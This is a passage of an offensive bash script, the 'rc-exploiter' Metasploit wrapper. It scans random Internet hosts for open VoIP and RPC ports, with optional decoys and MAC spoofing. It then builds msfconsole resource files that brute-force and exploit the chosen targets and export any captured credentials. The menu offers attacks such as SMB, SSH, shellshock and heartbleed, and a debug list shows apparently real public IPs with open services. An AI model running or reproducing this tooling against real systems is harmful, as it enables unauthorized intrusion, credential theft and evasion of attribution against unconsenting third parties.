  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/Default.txt") > /dev/null 2>&1


    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[rpc].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/rpc.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[RPC].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp rpc.rc rpc.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" rpc.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[rpc].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/rpc.bk $IPATH/exploits/rpc.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/rpc.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}










# --------------
# VOIP exploiter
# --------------
sh_17 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1



   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1


     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap -sU -T4 -iR $NUM -D $SPooF,$IP -PN -n -p U:5060 --open --reason -oN $IPATH/logs/Random-Hosts[VOIP].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 5060\nLOGFILE: Random-Hosts[VOIP].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap -sU -T4 -iR $NUM -PN -n -p U:5060 --open --reason -oN $IPATH/logs/Random-Hosts[VOIP].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 5060\nLOGFILE: Random-Hosts[VOIP].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[VOIP].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg MINEXT 100" >> $IPATH/db/msfdb.rc
       echo "setg MAXEXT 500" >> $IPATH/db/msfdb.rc
       echo "setg PADLEN 3" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 1" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[voip].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/voip.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[VOIP].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp voip.rc voip.bk > /dev/null 2<&1
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[voip].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/voip.bk $IPATH/exploits/voip.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/voip.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then


    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg MINEXT 100" >> $IPATH/db/msfdb.rc
       echo "setg MAXEXT 500" >> $IPATH/db/msfdb.rc
       echo "setg PADLEN 3" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 1" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[voip].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/voip.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[VOIP].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp voip.rc voip.bk > /dev/null 2<&1
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[voip].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/voip.bk $IPATH/exploits/voip.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/voip.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}










# ---------------------------
# Show targets for tool debug
# ---------------------------
sh_targets () {
Colors;
echo ""
echo "   hosts              port             proto      name             state"
echo "   -----              ----             -----      ----             -----"
echo "   162.144.100.186    21,22,3306       tcp        ftp,ssh,mysql    open "
echo "   163.232.86.155     135,139,445      udp/tcp    smb,samba        open "
echo "   104.152.154.253    135,137,139,445  tcp        smb              open "
echo "   198.13.103.178     3306             tcp        mysql            open "
echo "   209.59.188.26      22               tcp        ssh              open "
echo "   66.220.10.220      22               tcp        ssh              open "
echo "   54.127.92.142      22               tcp        ssh              open "
echo "   165.194.115.97     1433             tcp        ms-sql-s         open "
echo "   122.9.141.72       1433             tcp        ms-sql-s         open "
echo "   142.54.186.195     21               tcp        ftp              open "
echo "   107.148.148.35     21               tcp        ftp              open "
echo "   94.112.152.33      23               tcp        telnet           open "
echo "   195.100.38.81      23               tcp        telnet           open "
echo "   200.82.142.79      23               tcp        telnet           open "
echo "   212.129.52.219     3389             tcp        rdp              open "
echo "   88.200.219.47      443              tcp        ssl              open "
echo "   90.176.170.46      443              tcp        ssl              open "
echo "   192.116.71.163     443              tcp        ssl              open "
echo "   191.241.91.21      443              tcp        ssl              open "
echo "   94.199.178.215     443              tcp        ssl              open "
echo "   197.159.15.116     80               tcp        http             open "
echo "   105.157.187.83     80               tcp        http             open "
echo "   158.123.115.13     5900             tcp        vnc              open "
echo ""
echo ${YellowF}Press [${GreenF}ENTER${YellowF}] to continue...${Reset};
read op
}




# --------------------
# help - FAQ - display
# --------------------
sh_help () {
Colors;

   if [ -e $IPATH/bin/help.faq ]; then
     # display FAQ
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${GreenF}FREQUENT ASK QUESTIONS ${Reset};
     cat $IPATH/bin/help.faq | zenity --title "☠ FREQUENT ASK QUESTIONS ☠" --text-info --width 680 --height 370 > /dev/null 2>&1

else

zenity --warning --title="☠ ERROR -> [ help.faq ] NOT FOUND ☠" --text "can not display help...\nPlease download help.faq and place it:\n$IPATH/bin/help.faq" --width 380 > /dev/null 2>&1
fi
}





# ---------------------------
# exit script rc-exploiter.sh
# ---------------------------
sh_exit () {
Colors;
echo ${RedF}[x]☠ quiting module... ${Reset};



   # generate resource file to clean msf database
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Cleanning metasploit database... ${Reset};
   sleep 2
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
   sleep 1

   if [ "$OutPuT" = "YES" ]; then
     echo "spool off" > $IPATH/db/fullclean.rc
     echo "hosts -c address,name,os_name,os_flavor,purpose -o $IPATH/db/db_hosts.csv" >> $IPATH/db/fullclean.rc
     echo "services -c port,proto,name,state,info -o $IPATH/db/db_services.csv" >> $IPATH/db/fullclean.rc
     echo "creds -o $IPATH/db/db_creds.csv" >> $IPATH/db/fullclean.rc
     echo "hosts -d" >> $IPATH/db/fullclean.rc
   else
     echo "hosts -c address,name,os_name,os_flavor,purpose -o $IPATH/db/db_hosts.csv" > $IPATH/db/fullclean.rc
     echo "services -c port,proto,name,state,info -o $IPATH/db/db_services.csv" >> $IPATH/db/fullclean.rc
     echo "creds -o $IPATH/db/db_creds.csv" >> $IPATH/db/fullclean.rc
     echo "hosts -d" >> $IPATH/db/fullclean.rc
   fi

   echo "creds -d" >> $IPATH/db/fullclean.rc
   echo "services -d" >> $IPATH/db/fullclean.rc
   echo "unset all" >> $IPATH/db/fullclean.rc
   echo "unsetg all" >> $IPATH/db/fullclean.rc
   echo "jobs -K" >> $IPATH/db/fullclean.rc
   echo "sleep 3" >> $IPATH/db/fullclean.rc
   echo "exit -y" >> $IPATH/db/fullclean.rc
   chown $user $IPATH/db/fullclean.rc > /dev/null 2>&1

       # access msfdatabase
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
       xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/fullclean.rc"

     # cleanning old config files
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Cleanning recent files... ${Reset};
     rm -f $IPATH/db/fullclean.rc > /dev/null 2>&1
     mv $nSeLib/http.bk $nSeLib/http.lua
     # update nmap database rules
     nmap --script-updatedb > /dev/null 2>&1
     sleep 1
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Stoping metasploit services... ${Reset};



# stop metasploit/postgresql services-
if [ "$DiStRo" = "Kali" ]; then
/etc/init.d/postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
elif [ "$DiStRo" = "Ubuntu" ]; then
service metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
elif [ "$DiStRo" = "Parrot" ]; then
service metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi


    # CHECK TOOLKIT_CONFIG SETTINGS
    if [ "$ClF" = "YES" ]; then
      rm -f $IPATH/db/msfdb.rc > /dev/null 2>&1
      cd $IPATH/logs > /dev/null 2>&1
      rm -f *.log > /dev/null 2>&1
      chown $user $IPATH/temp > /dev/null 2>&1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ logs folder rebuild successfully... ${Reset};
      sleep 1
      sh_macch

    else

    # cleanning old config files
    rm -f $IPATH/db/msfdb.rc > /dev/null 2>&1
    sh_macch
fi
}


sh_macch () {
Colors;


  # check settings file and distro version installed
  if [ "$MaC" = "YES" ] && [ "$DiStRo" = "Ubuntu" ] || [ "$DiStRo" = "Mint" ]; then

    # check if macchanger exists
    m4cchanger=`which macchanger`
    if [ "$?" -eq "0" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[macchanger]:${white}installation found...${Reset};
      sleep 2
      # bring interface down
      echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[macchanger]:${white}Changing current mac address... ${Reset};
      service network-manager stop > /dev/null 2>&1
      sleep 3
      ifconfig $inter down > /dev/null 2>&1
      sleep 2
      macchanger -p $inter > /dev/null 2>&1
      # restarting network interface
      echo ${BlueF}[${YellowF}+${BlueF}]${white}☠ ${YellowF}[macchanger]:${white}Restarting [${GreenF}$inter${white}] interface... ${Reset};
      ifconfig $inter up > /dev/null 2>&1
      sleep 2
      service network-manager start > /dev/null 2>&1
      sleep 3
      sh_finall

    else

      # macchanger instalation not found
      echo ${RedF}[x]☠ [warning]:this module required 'macchanger' instaled to work...${Reset};
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[please wait]:${white}Downloading from network... ${Reset};
      sudo apt-get install macchanger macchanger-gtk
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[installed]:${YellowF}please run the script again... ${Reset};
      sleep 4
      sh_finall
    fi


  # check settings file and distro version installed
  elif [ "$MaC" = "YES" ] && [ "$DiStRo" = "Kali" ] && [ $VeRs \> $rDt ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[NetworkManager9]:${white} version found... ${Reset};
    EsSiD=$(zenity --title="Input ESSID" --text "example: Gh0st-Ubuntu" --entry --width 300) > /dev/null 2>&1

      # bring inteface down
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Stop network-manager... ${Reset};
      service network-manager stop > /dev/null 2>&1
      sleep 3
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Bring interface down... ${Reset};
      ifconfig $inter down > /dev/null 2>&1
      sleep 2
      # delete cloned mac addr from network manager
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Delete Cloned mac address from network-manager... ${Reset};
      find "/etc/NetworkManager/system-connections/$EsSiD" -type f -exec sh -c "sed -i \"/^cloned-mac-address.*/d;/^\[wifi\]/a\cloned-mac-address=\" \"{}\"" \;
      sleep 2

    # bring interface up
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Bring interface up... ${Reset};
    ifconfig $inter up > /dev/null 2>&1
    sleep 2
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Restart network-manager... ${Reset};
    service network-manager start > /dev/null 2>&1
    sleep 4
    sh_finall
    fi


sh_finall
}


# log tool activitty from previous modules used
sh_finall () {
Colors;
clear
cat << !

      ,.,          ~-~          .-.
     (~ ~)        ('¯')        (~ ~)
    q:0 0:p       )Ø Ø(        :o o:
     ((_))       ( (_) )      (((_)))
      'u'          '='          '-'

       codename: "the three stooges"
!
echo ${white}Develop by:[${GreenF}r00t-3xp10it${white}]☠  SSA-RedTeam@2016 ☠ ${Reset};
sleep 2
exit
}




# ---------------------------
# customize internal settings
# ---------------------------
sh_toolconf () {
Colors;

   # edit 'settings' config file
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Config framework settings... ${Reset};
   xterm -T "Customize Internal Settings" -geometry 81x42 -e "nano $IPATH/settings"

      # restart framework?
      Qu1=$(zenity --question --title "☠ RESTART FRAMEWORK? ☠" --text "Its advice to restart framework\nfor the changes take effect!" --width 350) > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then
          sh_exit # jump to exit cleanup
        else
          echo "good" > /dev/null
        fi
}




# -----------------
# obfuscated or not
# -----------------
sh_pass () {
Colors;

lSs=$(zenity --list --title "☠ LOGIN PROTECTED ☠" --text "chose option" --radiolist --column "Pick" --column "Option" TRUE "enable login" FALSE "disable login" --width 270) > /dev/null 2>&1

  if [ "$lSs" = "enable login" ]; then
    p0c=$(zenity --password --title "☠ LOGIN PROTECTED ☠" --text "Enter password for LOGIN protected" --width 270) > /dev/null 2>&1
    # use base64 to encode password string
    echo "$p0c" | base64 > $IPATH/bin/.obfuscated
    zenity --info --title="☠ LOGIN PROTECTED ☠" --text "password protected: $p0c" --width 270 > /dev/null 2>&1

  elif [ "$lSs" = "disable login" ]; then
    rm $IPATH/bin/.obfuscated > /dev/null 2>&1
    zenity --info --title="☠ LOGIN PROTECTED ☠" --text "Not active..." --width 270 > /dev/null 2>&1

else

  echo ${RedF}[x]☠ quiting module... ${Reset};
  sleep 2
fi
}










# ------------------------------
#  menu principal - loop forever
# ------------------------------
while :
do
clear
dtr=`date | awk '{print $4}'`
cat << !

 ██████╗  ██████╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
 ██╔══██╗██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║         █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
 ██╔══██╗██║         ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
 ██║  ██║╚██████╗    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
 ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
!

if [ "$MaC" = "YES" ]; then

  if [ "$ChE" = "YES" ]; then
  echo ${BlueF} VERSION:${GreenF}$ver ${BlueF}IP:${GreenF}$IP ${BlueF}SPOOFED_MAC:${GreenF}$st ${BlueF}USE_DECOYS:${GreenF}$SPooF ${Reset};
  echo ${BlueF} TIME:${white}$dtr ${BlueF}USER:${white}$user ${BlueF}DISTRO:${white}$DiStRo ${BlueF}INTERFACE:${white}$inter ${BlueF}ALL_SETTINGS:${white}stealth mode  ${Reset};
  else
  echo ${BlueF} VERSION:${GreenF}$ver ${BlueF}INTERFACE:${white}$inter ${BlueF}IP:${GreenF}$IP ${BlueF}SPOOFED_MAC:${GreenF}$st ${BlueF}TIME:${white}$dtr ${Reset};
  fi

else

  if [ "$ChE" = "YES" ]; then
  echo ${BlueF} VERSION:${GreenF}$ver ${BlueF}INTERFACE:${white}$inter ${BlueF}IP:${YellowF}$IP ${BlueF}USE_DECOYS:${GreenF}$SPooF ${BlueF}TIME:${white}$dtr ${Reset};
  else
  echo ${BlueF} VERSION:${GreenF}$ver ${BlueF}USER:${white}$user ${BlueF}INTERFACE:${white}$inter ${BlueF}IP:${RedF}$IP ${BlueF}DISTRO:${white}$DiStRo ${BlueF}TIME:${white}$dtr ${Reset};
  fi
fi

cat << !


         nº  DESCRIPTION           SERVICE(s)        RPORT(s)            RANK
      +--------------------------------------------------------------------------+
      |  1 - SAMBA                 SAMBA             T:139,445,161       ☆ ☆     |
      |  2 - SMB                   NETBIOS           T:137,139,445       ☆ ☆     |
      |  3 - ms-SQL                MSSQL             T:1433              ☆ ☆ ☆   |
      |  4 - mySql                 MYSQL             T:3306              ☆ ☆     |
      |  5 - ssh                   SSH               T:22                ☆ ☆ ☆   |
      |  6 - ftp                   FTP               T:21                ☆ ☆ ☆   |
      |  7 - telnet                TELNET            T:23                ☆ ☆ ☆   |
      |  8 - rdp(d0s)              RDP               T:3389              ☆ ☆     |
      |  9 - shellshock+ms15-034   HTTP              T:80                ☆ ☆ ☆   |
      | 10 - smtp                  SMTP              T:25                ☆ ☆     |
      | 11 - pop3                  POP3              T:110               ☆       |
      | 12 - imap                  IMAP              T:143,993           ☆ ☆     |
      | 13 - heartbleed+poodle     SSL               T:443               ☆ ☆ ☆   |
      | 14 - postgresql            postgresql        T:1433,5432         ☆ ☆ ☆   |
      | 15 - vnc                   VNC               T:5900              ☆ ☆     |
      | 16 - rpc                   RPC               T:135,389,1801,3790 ☆ ☆ ☆   |
      | 17 - voip                  VOIP              U:5060              ☆       |
      +--------------------------------------------------------------------------|
                                                                SSA-RedTeam@2016_|
        ~-~
       ('¯')     q ☆  Exit rc-exploiter module
       )Ø Ø(     s ☆  Config Internal settings
      ( (_) )   pass ☆  Activate script login
        '='     help ☆  Frequent ask questions


!
sleep 1
Colors;
echo ${RedF}'_'${Reset};
echo ${BlueF}[✎]${white}☠ ${BlueF}[ENTER YOUR CHOISE]${Reset};
echo ${BlueF}[✎]${white}☠ ${BlueF}Press [${GreenF}ctrl+c${BlueF}] to abort tasks'!'${Reset};
echo -n "$PrOmPt"
read choice
case $choice in
1) sh_1 ;;
2) sh_2 ;;
3) sh_3 ;;
4) sh_4 ;;
5) sh_5 ;;
6) sh_6 ;;
7) sh_7 ;;
8) sh_8 ;;
9) sh_9 ;;
10) sh_10 ;;
11) sh_11 ;;
12) sh_12 ;;
13) sh_13 ;;
14) sh_14 ;;
15) sh_15 ;;
16) sh_16 ;;
17) sh_17 ;;
q) sh_exit ;;
Q) sh_exit ;;
s) sh_toolconf ;;
S) sh_toolconf ;;
help) sh_help ;;
pass) sh_pass ;;
targets) echo "[➽ for debug proposes only."; sleep 1; sh_targets ;;
*) echo "\"$choice\":  Its not a valid choise ☠"; sleep 2 ;;
esac
done
